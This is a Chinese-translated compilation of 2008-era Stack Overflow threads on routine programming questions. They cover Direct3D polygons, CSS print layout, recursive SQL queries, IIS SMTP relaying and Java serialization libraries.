使用“windir”环境变量然后将“System32”附加到该路径的末尾可能会更安全。有时windows可能在不同的文件夹或不同的驱动器下，所以“windir”会告诉你它在哪里。

据我所知，system32 文件夹应该始终存在于 windows 文件夹下。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-01T14:44:07.990

仅供参考，但在终端服务器环境（即 Citrix）中，GetWindowsDirectory() 可能会为远程用户返回唯一路径。

[链接文本](http://msdn.microsoft.com/en-us/library/ms724454(VS.85).aspx)

随着越来越多的公司使用虚拟化桌面，开发人员需要牢记这一点。

# direct3d - 就 3D 图形而言，“多边形”是什么意思？

> ID：239226
> 
> 赞同：2
> 
> 时间：2008-10-27T06:49:59.700
> 
> 标签：direct3d

一本旧的 Direct3D 书说

> “......您可以通过硬件加速实现可接受的帧速率，同时每​​帧显示 2000 到 4000 个多边形......”

Direct3D 中的一个多边形是什么？它们是指一个基元（索引或其他）还是一个三角形？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-27T07:02:26.993

那本书的意思是三角形。否则，如果我想要 1000 面的多边形怎么办？我还能达到每帧 2000-4000 个这样的形状吗？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T07:02:48.117

在实践中，您唯一希望它是一个三角形，因为如果一个多边形不是三角形，它通常会被细分为一个三角形。（例如，一个四边形由两个三角形组成，等等）。一个基本的三角测量（镶嵌）算法非常简单；您只需遍历顶点并将每三个顶点变成一个三角形。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-11-17T01:26:52.767

这里，“多边形”是指三角形。全部 。但是，正如您所指出的，除了决定性能的三角形数量之外，还有更多变量。

重要的关键问题是：

*   存储格式（索引与否；列表、扇形或条形）
*   存储位置（主机内存顶点数组、主机内存顶点缓冲区或 GPU 内存顶点缓冲区）
*   渲染模式（是完全从主机发出的绘制原语命令，或通过实例化）
*   三角形尺寸

这些变量加在一起可以产生远大于 2 倍的性能变化。

同样，运行应用程序的硬件在现实世界中的性能可能相差 10 倍或更多：2005 年低端的 GPU（或集成图形处理器）在任何有意义的指标上都将比当前的性能慢 10-100 倍顶级GPU。

总而言之，任何使用 2-4000 个三角形的建议都已经过时了，以至于今天应该完全忽略它。即使是今天的低端硬件也可以在合理的条件下轻松地将 100,000 个三角形推入一个框架中。此外，当今大多数视觉上有趣的应用程序都以像素着色性能为主，而不是三角形计数。

当今实现良好三角形吞吐量的一般经验法则：

*   使用 [indexed] 三角形（或四边形）列表
*   将数据存储在 GPU 内存顶点缓冲区中
*   使用每个绘制图元调用（数千个图元）绘制大批量
*   在屏幕上主要使用 >= 16 像素的三角形
*   不要使用几何着色器（尤其是几何放大）

做所有这些事情，今天的任何机器都应该能够轻松渲染数万或数十万个三角形。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-27T06:52:37.137

根据这个[页面](http://msdn.microsoft.com/en-us/library/microsoft.windowsmobile.directx.direct3d.mesh.polygon.aspx)，多边形在 Direct3d 中是 n 边的。

在 C# 中：

```
public static Mesh Polygon(
    Device device,
    float length,
    int sides
) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-13T13:56:26.540

正如其他人已经说过的，这里的多边形意味着三角形。三角形的主要优点是，由于 3 个点定义了一个平面，因此三角形根据定义是共面的。这意味着三角形内的每个点都被精确地定义为多边形点的线性组合。更多的顶点不一定是共面的，它们也没有定义一个唯一的曲面。

与图形相比，机械建模的一个优势是三角形也是不可变形的。

# javascript - 使用 window.print() 时可以更改页面布局吗？

> ID：239232
> 
> 赞同：11
> 
> 时间：2008-10-27T06:54:05.823
> 
> 标签：javascript

在我们的应用程序中，我们允许用户打印页面。我们通过提供一个按钮来做到这一点，当单击该按钮时会调用 window.print() 函数。
如果以横向模式而不是纵向模式打印某些页面，它们看起来会更好。有没有办法从 JavaScript 控制页面布局？

更新：按照此处给出的建议，我在 google 中查找了“css Landscape”，并找到了[以下文章](http://www.tek-tips.com/faqs.cfm?fid=5803)，该文章显示了 css-ly 定义景观的方式：

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-27T06:58:29.170

您应该使用打印样式表。

```
<link rel="stylesheet" href="print.css" type="text/css" media="print" /> 
```

更多信息...

[如何只打印页面的一部分？](https://stackoverflow.com/questions/224078/how-to-print-only-parts-of-a-page)

编辑：强制横向，显然标准是`size: landscape`，但我不知道跨浏览器的支持程度。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T06:56:40.110

通过包含一个打印样式表来使用 CSS 执行此操作：

```
<style type="text/css" media="print">@import url("/inc/web.print.css");</style> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-27T07:18:57.490

我认为您的问题与其说是使用 CSS 定义打印样式，不如说是强制打印为横向而不是纵向？

CSS 2 定义了“大小”，但我认为这并没有得到广泛支持： [http ://www.w3schools.com/css/css_ref_print.asp](http://www.w3schools.com/css/css_ref_print.asp)

CSS 3 具有更好的打印控制，但同样没有得到广泛支持。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T07:47:26.340

不幸的是，这仍然不可能跨浏览器。对于 Internet Explorer，有一个[ActiveX 控件](http://www.meadroid.com/scriptx/about.asp)可以执行此操作。

否则，您最好的选择可能是提供 PDF 版本的打印选项。

# python - Python：GQuery 结果集上的 DISTINCT（GQL、GAE）

> ID：239258
> 
> 赞同：7
> 
> 时间：2008-10-27T07:13:11.713
> 
> 标签：python, sql, google-app-engine, distinct, gql

想象一下，您在 Google App Engine 数据存储区中有一个实体，为匿名用户存储链接。您想要执行以下不受支持的 SQL 查询：

```
SELECT DISTINCT user_hash FROM links 
```

相反，您可以使用：

```
user = db.GqlQuery("SELECT user_hash FROM links") 
```

如何**最有效**地使用 Python过滤结果，使其返回 DISTINCT 结果集？如何计算 DISTINCT 结果集？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-05T07:38:24.033

恢复这个问题以完成：

DISTINCT 关键字已在[1.7.4 版本](http://googleappengine.blogspot.com/2012/12/app-engine-174-released.html)中引入。

[您可以在此处](https://developers.google.com/appengine/docs/python/datastore/gqlreference)找到更新的 GQL 参考（例如 Python）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-27T08:25:57.947

一套是处理这个问题的好方法：

```
>>> a = ['google.com', 'livejournal.com', 'livejournal.com', 'google.com', 'stackoverflow.com']
>>> b = set(a)
>>> b
set(['livejournal.com', 'google.com', 'stackoverflow.com'])
>>> 
```

第一个答案的一个建议是，集合和字典更擅长快速检索独特的结果，列表中的成员资格是 O(n) 而其他类型的成员资格是 O(1)，所以如果你想存储额外的数据, 或执行类似创建上述`unique_results`列表的操作，最好执行以下操作：

```
unique_results = {}
>>> for item in a:
    unique_results[item] = ''

>>> unique_results
{'livejournal.com': '', 'google.com': '', 'stackoverflow.com': ''} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T08:01:47.747

一种选择是将结果放入一个集合对象中：

[http://www.python.org/doc/2.6/library/sets.html#sets.Set](http://www.python.org/doc/2.6/library/sets.html#sets.Set)

结果集将仅包含传递给它的不同值。

如果做不到这一点，建立一个只包含唯一对象的新列表将起作用。就像是：

```
unique_results = []
for obj in user:
    if obj not in unique_results:
        unique_results.append(obj) 
```

该`for`循环也可以压缩为列表理解。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2011-03-17T15:04:24.720

很抱歉提出这个问题，但在 GAE 中我无法比较这样的对象，我必须使用 .key() 进行这样的比较：

当心，这是非常低效的：

```
def unique_result(array):
    urk={} #unique results with key
    for c in array:
        if c.key() not in urwk:
            urk[str(c.key())]=c
    return urk.values() 
```

如果有人有更好的解决方案，请分享。

# security - 我可以在 IIS 中配置 SMTP，以便它中继到远程 SMTP 服务器吗？

> ID：239262
> 
> 赞同：11
> 
> 时间：2008-10-27T07:20:02.463
> 
> 标签：security, iis, email, smtp

我想在我的 Web 服务器上配置 SMTP，以便通过 SMTP 服务器发送的任何电子邮件都被中继到远程 SMTP 服务器。IIS SMTP 服务器必须使用 SMTP 身份验证，并使用主机名、用户名和密码（就像配置普通电子邮件客户端一样）。

有人知道这是否可能吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-27T18:09:40.780

是的，这是完全可能的，并且相对容易配置。

我的网站上有几篇关于 SmartHosting 的文章可能会有所帮助：

[http://www.christopherlewis.com/SmartHosting/SMTPSmartHosting.htm](http://www.christopherlewis.com/SmartHosting/SMTPSmartHosting.htm)
和
[http://www.christopherlewis.com/SmartHosting/SMTPSmartHostingPt2.htm](http://www.christopherlewis.com/SmartHosting/SMTPSmartHostingPt2.htm)

它们是针对 Exchange 2003 编写的，但 Exchange 2003 使用 IIS 的 SMTP 引擎，因此设置相同。

基本上，您右键单击 SMTP 站点，选择属性、传递选项卡、出站安全，然后在基本身份验证字段中输入您的凭据。返回到 Delivery 选项卡，然后单击 Advanced 并在 SmartHost 字段中输入远程 SMTP 服务器名称。

## **编辑**

上面的链接不再可用。

试试[http://intellitect.com/configuring-windows-smtp-server-on-windows-2008-for-relay/](http://intellitect.com/configuring-windows-smtp-server-on-windows-2008-for-relay/)。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2008-10-27T07:33:13.797

HTH 并满足您的需求

[http://www.cmsconnect.com/praetor/webhelpg2/Chapter_2_-_Pre-installation_considerations/Configuring_the_SMTP_Server.htm](http://www.cmsconnect.com/praetor/webhelpg2/Chapter_2_-_Pre-installation_considerations/Configuring_the_SMTP_Server.htm)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2008-10-27T07:36:46.563

我认为您只能为特定域设置出站中继，而不是全面覆盖。

[http://www.isaserver.org/articles/smtprelayinboundoutbound.html](http://www.isaserver.org/articles/smtprelayinboundoutbound.html)

编辑：我以前没有这样做过，购买也许值得一试：

从服务器属性中，您可以尝试选择“交付”选项卡，然后选择高级。在智能主机中，键入传出 SMTP 中继 IP/域。选择确定，然后选择“出站安全”并在基本身份验证框中输入您的用户名/密码。

# asp.net-mvc - 是否有必要为每个控制器操作有一个单独的视图？

> ID：239263
> 
> 赞同：1
> 
> 时间：2008-10-27T07:20:48.640
> 
> 标签：asp.net-mvc

控制器动作和视图之间是否存在强制关系？我的意思是控制器类中的每个动作都需要一个物理视图（.aspx 页面）吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T07:31:30.257

控制器动作和视图之间没有强制关系。控制器负责返回一个 ActionResult。最常用的方法是使用视图，但它们不是硬连线的。例如，可以跨控制器共享视图。

也是一个控制器，可以完全自己处理请求，返回一个重定向，或者一个 JSON 结果，甚至它自己的 html（虽然不推荐）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-27T10:35:26.640

您还可以在操作中返回诸如 ContentResult 之类的内容：

```
public ContentResult Index()
{
    return Content("Foobar!");
} 
```

如果直接调用它，这将类似于：

```
Response.Write("Foobar!");
Response.End(); 
```

# windows-installer - 有人得到了 MSIINV.EXE 的副本吗？

> ID：239264
> 
> 赞同：7
> 
> 时间：2008-10-27T07:24:56.870
> 
> 标签：windows-installer, uninstallation

有人有 MSIINV.EXE（MSI Inventory 工具）的副本吗？以前可用的站点已关闭（[http://www.huydao.net/](http://www.huydao.net/)）。我正在尝试卸载某些组件以强制 Visual Studio 安装程序重新安装它们。我很抱歉，因为这不是一个严格的编程问题，但我认为任何安装了一些 Visual Studio 测试版的人也可能遇到了这个问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2018-09-07T18:55:27.673

我创建了一个 GitHub 存储库，其中包含原始源代码和 MsiInv.exe 的 .exe 副本。我是原作者。

[https://github.com/ZisBoom/MsiInv.exe](https://github.com/ZisBoom/MsiInv.exe)

我最常见的用法是`msiinv.exe -p`列出所有已安装的产品，或`msiinv.exe -p | findstr /i <pattern>`查找特定产品。 `msiinv.exe -p <leading match>`要求您知道产品的“startswith”名称，而 findstr 对子字符串很有用。

命令行选项：

```
msiinv.exe -?
Usage: msiinv.exe [option [option]]
    -p [product]    Product list
    -f      Feature state by product. (includes -p)
    -q      Component count by product (includes -p)
    -#      Component count and features states by product (-p -f -q)

    -x      Orphaned components.
    -m      Shared components.
    -c      Evaluate components (-x -m).

    -l      List of log files.

    -t      Elapsed time for run. (Benchmarking)

    -s      Reduced output.(-p -#)
    -n      Normal output. (default)
    -v      Verbose output. (default + feature and component lists) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T09:53:02.483

那个工具有什么作用？它是否列出了来自 MSI 的组件 GUID？如果是这样，我发现[WiX](http://wix.sourceforge.net)的 DARK 工具可以很好地告诉我 MSI 中的内容。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-06-05T15:44:07.917

msiinv.exe 工具实际上只是列出所有已安装 MSI 软件包的 GUI。您可以使用文件作为输出。

然后 MSI 清单工具将提供所需的 GUI，以便运行“msiexec.exe /x {B3A02601-8FE9-4108-8E95-D94171A2F8C8}”并卸载所需的包。

谢谢。

信仰。

# java - JAXB 或 StAX 消息限制

> ID：239265
> 
> 赞同：1
> 
> 时间：2008-10-27T07:25:14.623
> 
> 标签：java, jaxb, jax-ws, stax

我目前正在使用 Axis 2 实现在 Bea Websphere 6.1 环境中开发 WebService，我正在尝试尊重 Web 服务的当前标准（JAXB、JAXWS、StAX ...）。

在这个平台上，一条 XML 消息可以存在多长时间？

我四处搜索，但没有找到与该主题相关的任何内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T16:00:43.553

不太了解您所在平台的限制，但总的来说，没有硬性限制。将 Axis 与标准 SOAP 堆栈一起使用将采用 SOAP 信封并在内存中创建它的表示形式（dom 或类似 dom），从而限制了堆大小。如果使用非常大的 XML，更好的方法是使用 STaX，它是一个 XML 流解析器库。这将消除您可能使用或创建的 XML 大小的所有限制。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-10T03:35:32.637

是的，由于 Jax-ws 和 SOAP 的工作方式，整个有效负载被绑定：要么绑定到树（更高的内存使用）或 POJO/bean（更低的内存使用）。无论哪种方式，内存使用量都与消息大小成正比。

尽管理论上可以为 Soap 处理创建流式传输/分块接口，但实现起来并非易事，目前还没有堆栈这样做。

# sql - 如何在 MSSQL 2005 中创建递归查询？

> ID：239275
> 
> 赞同：24
> 
> 时间：2008-10-27T07:37:23.973
> 
> 标签：sql, sql-server, database, recursion

假设我有下表：

```
CustomerID ParentID Name
========== ======== ====
1          null     John
2          1        James
3          2        Jenna
4          3        Jennifer
5          3        Peter
6          5        Alice
7          5        Steve
8          1        Larry 
```

我想在一个查询中检索詹姆斯的所有后代（珍娜、詹妮弗、彼得、爱丽丝、史蒂夫）。谢谢，巴勃罗。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2008-10-27T08:01:03.240

在 SQL Server 2005 上，您可以使用[CTE（公用表表达式）](http://www.4guysfromrolla.com/webtech/071906-1.shtml)：

```
with Hierachy(CustomerID, ParentID, Name, Level)
as
(
select CustomerID, ParentID, Name, 0 as Level
    from Customers c
    where c.CustomerID = 2 -- insert parameter here
    union all
    select c.CustomerID, c.ParentID, c.Name, ch.Level + 1
    from Customers c
    inner join Hierachy ch
    on c.ParentId = ch.CustomerID
)
select CustomerID, ParentID, Name
from Hierachy
where Level > 0 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2010-09-25T13:28:29.457

对于自下而上，使用 mathieu 的答案并稍作修改：

```
 with Hierachy(CustomerID, ParentID, Name, Level)
as
(
select CustomerID, ParentID, Name, 0 as Level
    from Customers c
    where c.CustomerID = 2 -- insert parameter here
    union all
    select c.CustomerID, c.ParentID, c.Name, ch.Level + 1
    from Customers c
    inner join Hierachy ch

    -- EDITED HERE --
    on ch.ParentId = c.CustomerID
    ----------------- 

)
select CustomerID, ParentID, Name
from Hierachy
where Level > 0 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T07:44:23.320

如果没有存储过程，就不能在 SQL 中进行递归。解决这个问题的方法是使用嵌套集，它们基本上将 SQL 中的树建模为一个集合。

请注意，这将需要对当前数据模型进行更改，或者可能需要弄清楚如何在原始模型上创建视图。

Postgresql 示例（使用很少的 postgresql 扩展，仅使用 SERIAL 和 ON COMMIT DROP，大多数 RDBMS 将具有类似的功能）：

设置：

```
CREATE TABLE objects(
    id SERIAL PRIMARY KEY,
    name TEXT,
    lft INT,
    rgt INT
);

INSERT INTO objects(name, lft, rgt) VALUES('The root of the tree', 1, 2); 
```

添加一个孩子：

```
START TRANSACTION;

-- postgresql doesn't support variables so we create a temporary table that 
-- gets deleted after the transaction has finished.

CREATE TEMP TABLE left_tmp(
    lft INT
) ON COMMIT DROP; -- not standard sql

-- store the left of the parent for later use
INSERT INTO left_tmp (lft) VALUES((SELECT lft FROM objects WHERE name = 'The parent of the newly inserted node'));

-- move all the children already in the set to the right
-- to make room for the new child
UPDATE objects SET rgt = rgt + 2 WHERE rgt > (SELECT lft FROM left_tmp LIMIT 1);
UPDATE objects SET lft = lft + 2 WHERE lft > (SELECT lft FROM left_tmp LIMIT 1);

-- insert the new child
INSERT INTO objects(name, lft, rgt) VALUES(
    'The name of the newly inserted node', 
    (SELECT lft + 1 FROM left_tmp LIMIT 1), 
    (SELECT lft + 2 FROM left_tmp LIMIT 1)
);

COMMIT; 
```

显示从下到上的轨迹：

```
SELECT
    parent.id, parent.lft
FROM
    objects AS current_node
INNER JOIN
    objects AS parent
ON
    current_node.lft BETWEEN parent.lft AND parent.rgt
WHERE
    current_node.name = 'The name of the deepest child'
ORDER BY
    parent.lft; 
```

显示整个树：

```
SELECT
    REPEAT('   ', CAST((COUNT(parent.id) - 1) AS INT)) || '- ' || current_node.name AS indented_name
FROM
    objects current_node
INNER JOIN
    objects parent
ON
    current_node.lft BETWEEN parent.lft AND parent.rgt
GROUP BY
    current_node.name,
    current_node.lft
ORDER BY
    current_node.lft; 
```

从树的某个元素向下选择所有内容：

```
SELECT
    current_node.name AS node_name
FROM
    objects current_node
INNER JOIN
    objects parent
ON
    current_node.lft BETWEEN parent.lft AND parent.rgt
AND
    parent.name = 'child'
GROUP BY
    current_node.name,
    current_node.lft
ORDER BY
    current_node.lft; 
```

* * *

## 回答 #4

> 赞同：-9
> 
> 时间：2008-10-27T18:13:27.030

除非我遗漏了什么，否则递归是不必要的......

```
SELECT d.NAME FROM Customers As d
INNER JOIN Customers As p ON p.CustomerID = d.ParentID
WHERE p.Name = 'James' 
```

# database - 根据单个列标题检查/更新一行值

> ID：239278
> 
> 赞同：1
> 
> 时间：2008-10-27T07:41:00.440
> 
> 标签：database, ms-access, vba

我有很多表的数据库。在第一个表中，我有一个名为`status`.

```
table 1
idno   name    status
111    hjghf   yes
225    hjgjj   no
345    hgj     yes 
```

其他表可能具有相同`idno`的不同字段。

我想检查每个 ID 号的状态，如果是，那么对于所有表中的所有空字段和空白字段的 ID 号，我想将它们更新为 111111。

我正在寻找一个我可以适应的示例 vba 代码。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-10-28T00:35:07.570

MS Access 的多表更新语法：

```
UPDATE Table2
INNER JOIN Table1
  ON Table2.idno = Table1.idno
SET Table2.salary = 111111
WHERE Table1.status = 'yes'
AND Table2.salary Is Null 
```

您可以进入 SQL 视图进行查询，将其粘贴进去，然后运行查询，或者将其分配给字符串并使用 CurrentDb.Execute 或 CurrentProject.Connection.Execute，具体取决于您的 DAO/ADO 首选项。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2008-10-27T19:50:58.923

这是一些很大程度上未经测试的代码。希望它会给你一个开始。

```
Sub UpdateNulls()
Dim strSQL As String
Dim rs As DAO.Recordset
For Each tdf In CurrentDb.TableDefs
    If Left(tdf.Name, 4) <> "Msys" And tdf.Name <> "Table1" Then
        strSQL = "Select * From [" & tdf.Name & "] a Inner Join " _
        & "Table1 On a.idno = Table1.idno Where Table1.Status = 'Yes'"

        Set rs = CurrentDb.OpenRecordset(strSQL)

        Do While Not rs.EOF
            For i = 0 To rs.Fields.Count - 1
                If IsNull(rs.Fields(i)) Then
                    rs.Edit
                    rs.Fields(i) = 111111
                    rs.Update
                End If
            Next
            rs.MoveNext
        Loop

    End If
Next
End Sub 
```

# java - 哪个是 Java 序列化的最佳替代方案？

> ID：239280
> 
> 赞同：52
> 
> 时间：2008-10-27T07:41:18.910
> 
> 标签：java, serialization, xml-serialization

我目前正在开发一个项目，该项目需要保留任何类型的对象（我们无法控制其实现），以便之后可以恢复这些对象。

我们无法实现 ORM，因为我们无法在开发时限制库的用户。

我们的第一个替代方案是使用 Java 默认序列化对其进行序列化，但是当用户开始传递同一对象的不同版本（属性更改类型、名称等）时，我们在恢复对象时遇到了很多麻烦。

我们尝试过使用 XMLEncoder 类（将对象转换为 XML），但我们发现缺少功能（例如不支持 Enums）。

最后，我们还尝试了 JAXB，但这迫使我们的用户注释他们的类。

有什么好的选择吗？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2011-03-14T02:46:20.870

现在是 2011 年，在商业级 REST Web 服务项目中，我们使用以下序列化程序为客户提供各种媒体类型：

*   [XStream](http://x-stream.github.io/)（适用于 XML，但不适用于 JSON）
*   [杰克逊](https://github.com/FasterXML/jackson)（用于 JSON）
*   [Kryo](https://github.com/EsotericSoftware/kryo)（一种快速、紧凑的二进制序列化格式）
*   [微笑](https://github.com/FasterXML/jackson-dataformat-smile)（Jackson 1.6 及更高版本附带的二进制格式）。
*   Java 对象序列化。

我们最近尝试了其他序列化程序：

*   [SimpleXML](http://simple.sourceforge.net/)看起来很可靠，运行速度是 XStream 的 2 倍，但在我们的情况下需要太多配置。
*   [YamlBeans](http://code.google.com/p/yamlbeans/)有几个错误。
*   [SnakeYAML](http://code.google.com/p/snakeyaml/)有一个与日期相关的小错误。

Jackson JSON、Kryo 和 Jackson Smile 都比旧的 Java 对象序列化快得多，大约快 3 到 4.5 倍。XStream 速度较慢。但在这一点上，这些都是可靠的选择。我们将继续监视其他三个。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2008-10-27T07:43:35.367

[http://x-stream.github.io/](http://x-stream.github.io/)不错，请看一下！很方便

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2008-10-27T12:39:10.993

> *我们无法控制哪些实现*

解决方案是*不要这样做*。如果您无法控制类型的实现，则不应将其序列化。故事结局。Java 序列化提供了专门用于管理类型不同版本之间的序列化不兼容性的 serialVersionUID。如果您不控制实现，则无法确保在开发人员更改类时正确更改了 ID。

举一个“点”的简单例子。它可以用笛卡尔坐标系或极坐标系来表示。构建一个可以动态处理这些修正的系统的成本太高了——它确实必须是设计序列化的类的开发人员。

简而言之，错的是你的设计——而不是技术。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2008-10-27T12:23:13.867

对你来说最简单的事情仍然是使用序列化，IMO，但更多地考虑类的序列化形式（无论如何你真的应该这样做）。例如：

1.  显式定义 SerialUID。
2.  在适当的地方定义您自己的序列化表单。

序列化形式是类 API 的一部分，在其设计中应仔细考虑。

我不会详细介绍，因为我所说的几乎所有内容都来自 Effective Java。相反，我将向您推荐它，特别是有关序列化的章节。它会警告您遇到的所有问题，并为问题提供适当的解决方案：

[http://www.amazon.com/Effective-Java-2nd-Joshua-Bloch/dp/0321356683](https://rads.stackoverflow.com/amzn/click/com/0321356683)

* * *

话虽如此，如果您仍在考虑非序列化方法，这里有几个：

**XML 编组**

正如许多人指出的那样，这是一种选择，但我认为您仍然会遇到向后兼容性的相同问题。但是，通过 XML 编组，您有望立即捕捉到这些，因为某些框架可能会在初始化期间为您做一些检查。

**与 YAML 的转换**

这是我一直在玩弄的一个想法，但我真的很喜欢 YAML 格式（至少作为自定义的 toString() 格式）。但实际上，对您而言，唯一的区别是您将编组为 YAML 而不是 XML。唯一的好处是 YAML 比 XML 更易于阅读。同样的限制适用。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2008-10-28T02:46:35.153

google 提出了一种二进制协议——http: [//code.google.com/apis/protocolbuffers/](http://code.google.com/apis/protocolbuffers/)速度更快，与 XML 相比具有更小的有效负载——其他人建议将其作为替代协议。

协议缓冲区的优点之一是它可以与 C、C++、python 和 java 交换信息。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2008-10-27T07:45:54.347

例如，尝试使用[Gson](http://code.google.com/p/google-gson/)序列化为 json 。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2012-12-06T22:23:54.233

也是一个非常快速的 JDK 序列化插件替换： [http ://ruedigermoeller.github.io/fast-serialization/](http://ruedigermoeller.github.io/fast-serialization/)

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2013-07-16T11:53:31.973

如果序列化速度对您很重要，那么这里有一个 JVM 序列化程序的综合基准：

*   [https://github.com/eishay/jvm-serializers/wiki](https://github.com/eishay/jvm-serializers/wiki)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-10-27T11:15:37.310

可能是[蓖麻](http://www.castor.org/)？

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-10-27T12:39:23.240

就个人而言，我经常使用[Fame](http://smallwiki.unibe.ch/fame/)，因为它具有与 Smalltalk（大众和 Squeak）和 Python 的互操作性。（免责声明，我是 Fame 项目的主要贡献者。）

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-10-28T02:34:14.647

[Betwixt](http://commons.apache.org/betwixt/)是一个很好的序列化对象库——但它不会是一种自动的东西。如果您必须序列化的对象数量相对固定，这对您来说可能是一个不错的选择，但如果您的“客户”一直向您抛出新类，则可能会付出更多的努力而不值得（但是，对于所有特殊情况，绝对比 XMLEncoder 更容易）。

另一种方法是要求您的客户为他们扔给您的任何对象提供适当的 .betwixt 文件（这有效地减轻了他们的责任）。

长短 - 序列化*很难*- 没有完全脑死的方法。Java 序列化是我所见过的最接近脑死的解决方案，但正如您所发现的，不正确地使用版本 uid 值可能会破坏它。Java 序列化还需要使用标记“Serializable”接口，所以如果你不能控制你的源代码，那你就有点不走运了。

如果要求确实如您所描述的那样艰巨，您可能不得不对对象/方面/任何东西诉诸某种 BCE（字节码修改）。这已经超出了一个小型开发项目的领域，进入了 Hibernate、Casper 或 ORM 的领域......

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2019-04-13T08:42:28.033

SBE 是一个成熟的库，用于快速、基于字节缓冲区的序列化库，并且能够进行版本控制。但是，它有点难以使用，因为您需要在其上编写长度包装类。

鉴于它的缺点，我最近做了一个受 SBE 和 FIX 协议（交换交易/报价消息的通用金融市场协议）启发的纯 Java 序列化库，它试图在克服它们的弱点的同时保持两者的优点。你可以看看[https://github.com/iceberglet/anymsg](https://github.com/iceberglet/anymsg)

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2013-08-10T21:57:06.923

另一个想法：使用缓存。缓存为应用程序提供了更好的控制、可扩展性和健壮性。尽管如此，仍然需要序列化，但是在缓存服务框架内管理变得更加容易。缓存可以保存在内存、磁盘、数据库或阵列中——或所有选项中——其中一个是溢出、备用、故障转移。Commons JCS 和 Ehcache 是两个 java 实现，后者是一个企业解决方案，最多可释放 32 GB 的存储空间（免责声明：我不为 ehcache 工作；-)）。

# java - 使用内联链接文档将 html 转换为 pdf

> ID：239300
> 
> 赞同：2
> 
> 时间：2008-10-27T07:59:29.827
> 
> 标签：java, html, pdf

我需要最好使用批处理在 Java/J2EE 平台上的服务器端以编程方式将一组静态 HTML 文档转换为单个 PDF 文件。pdf 文件将分发给站点用户以供离线浏览网页。

要求主要有以下几点：

1.  顶部的横幅不应出现在最终的 pdf 文档中。
2.  左侧的导航栏应该从 html 超链接转换为 pdf 书签。
3.  网页中出现的所有超链接内容（html/pdf/doc/docx 等）都应该是带有 pdf 书签的最终 pdf 文档的一部分。

有没有标准的开源方式来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T08:56:22.987

试试[Apache FOP](http://xmlgraphics.apache.org/fop/)。我只是用它来[将 XML 转换为 PDF](https://stackoverflow.com/questions/212577/how-do-you-create-a-pdf-from-xml-in-java)，我认为你可以用 HTML/DOM 做同样的事情。该网站有[一整节](http://xmlgraphics.apache.org/fop/0.95/embedding.html)关于在 Java 应用程序中运行 FOP 以及[DOM 到 PDF 的示例代码](http://xmlgraphics.apache.org/fop/0.95/embedding.html#ExampleDOM2PDF)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-25T07:14:44.340

您可以为此尝试[www.alt-soft.com Xml2PDF](http://www.alt-soft.com)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T08:07:16.160

您可以尝试[iText](http://www.lowagie.com/iText) - 但我不确定它是否能满足您的所有需求。

此外，如果您探索许多选项，然后决定您能做什么和不能做什么，总是会更好。在许多情况下，不会有任何库/API 开箱即用地支持您所要求的一切。

# ruby - 如何比较浮点数和增量？

> ID：239301
> 
> 赞同：9
> 
> 时间：2008-10-27T08:00:22.913
> 
> 标签：ruby

Ruby 中是否有一些功能/语法可以将两个浮点数与 delta 进行比较？类似于*test/unit*中的*assert_in_delta(expected_float, actual_float, delta)*但返回布尔值？

 ** * *

## 回答 #1

> 赞同：23
> 
> 时间：2008-10-27T08:10:00.960

```
(expected_float - actual_float).abs <= delta 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-22T03:45:52.663

根据您的应用程序以及您的浮点值实际表示的内容，将它们转换为具有给定精度的 Rationals 可能是有意义的。然后直接比较将始终正确运行，因为 Rationals 只是两个整数。

例如，如果您知道您正在处理美国货币金额，则将它们存储为`amount.to_r.round(2)`允许精确比较是否相等。

只是一个想法......并非所有非整数值都需要不精确表示的浮点数

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2008-10-27T17:20:43.687

您可能还需要相对公差/增量计算

[http://realtimecollisiondetection.net/blog/?p=89](http://realtimecollisiondetection.net/blog/?p=89)

